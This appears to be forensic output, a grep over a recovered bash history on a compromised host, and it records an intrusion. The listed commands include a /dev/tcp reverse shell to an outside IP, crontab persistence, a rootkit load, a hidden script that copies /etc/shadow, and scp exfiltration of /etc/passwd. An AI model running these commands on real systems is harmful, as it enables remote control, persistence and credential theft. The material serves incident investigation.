@@ -1,0 +1,15 @@
+$ grep -E 'PID|/dev/tcp|nc -nlvp|http.server|runme|rootkit|scp' /root/defops/out/fs01/bash.txt
+PID	Process	CommandTime	Command
+14204	bash	2025-06-02 10:34:33.000000 UTC	bash -i >& /dev/tcp/10.12.14.32/4567 0>&1
+14847	bash	2025-06-02 10:36:27.000000 UTC	echo "* * * * * root bash -i >& /dev/tcp/10.12.14.32/4567 0>&1" >> /etc/crontab
+14847	bash	2025-06-02 10:37:02.000000 UTC	isnmod rootkit.ko
+14847	bash	2025-06-02 10:37:11.000000 UTC	insmod rootkit.ko
+14847	bash	2025-06-02 10:39:46.000000 UTC	chmod +x /dev/shm/.runme.sh
+14847	bash	2025-06-02 10:39:46.000000 UTC	echo -ne '#!/bin/bash\necho "* * * * * root bash -i >& /dev/tcp/10.12.14.32/4567 0>&1" >> /etc/crontab\nwhoami\nls\ncp /etc/shadow /tmp/shadow_dump' > /dev/shm/.runme.sh
+14847	bash	2025-06-02 10:39:51.000000 UTC	/dev/shm/.runme.sh
+14847	bash	2025-06-02 10:41:17.000000 UTC	scp /etc/passwd root@10.10.34.91:/home/
+14847	bash	2025-06-02 10:41:44.000000 UTC	nc -nlvp 9898
+15044	bash	2025-06-02 11:12:23.000000 UTC	scp /tmp/memdump.raw ubuntu@10.10.34.91:/home/ubuntu
+17327	bash	2025-06-02 11:12:40.000000 UTC	scp /tmp/memdump.raw ubuntu@10.10.34.91:/home/ubuntu
+17344	bash	2025-06-02 11:13:24.000000 UTC	python -m http.server 9090
+17344	bash	2025-06-02 11:13:29.000000 UTC	python3 -m http.server 9090
